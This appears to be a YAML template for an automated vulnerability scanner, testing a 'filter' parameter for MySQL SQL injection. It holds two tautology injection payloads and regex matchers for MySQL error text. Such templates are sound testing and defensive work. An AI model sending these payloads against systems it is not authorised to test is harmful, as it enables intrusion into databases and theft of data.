id: sqli6-mysql-28
name: 'SQLi mysql probe in filter'
severity: high
type: active
tags:
  - sqli
  - injection
  - mysql
description: 'Triggers mysql error via filter'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      filter:
        - '1''||''1''=''1'
        - '" OR "1"="1'
    matchers:
      - type: regex
        part: body
        regex:
          - 'SQL syntax'
          - 'mysql_fetch'
